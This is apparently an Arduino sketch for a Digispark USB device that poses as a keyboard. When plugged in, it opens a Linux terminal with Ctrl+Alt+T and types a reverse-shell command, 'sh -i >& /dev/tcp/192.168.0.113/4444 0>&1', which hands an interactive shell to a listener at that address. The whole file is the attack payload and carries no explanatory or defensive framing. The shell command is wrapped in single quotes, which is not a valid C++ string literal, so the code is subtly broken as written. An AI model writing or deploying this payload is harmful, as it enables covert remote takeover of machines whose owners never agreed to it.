
#include "DigiKeyboard.h"

void setup() {
}

void loop() {

  DigiKeyboard.update();

  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(0x17,MOD_ALT_LEFT|MOD_CONTROL_RIGHT);
  DigiKeyboard.delay(500);

  DigiKeyboard.println('sh -i >& /dev/tcp/192.168.0.113/4444 0>&1'); 
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(2000);
 for(;;){ /*empty*/ }
 

}
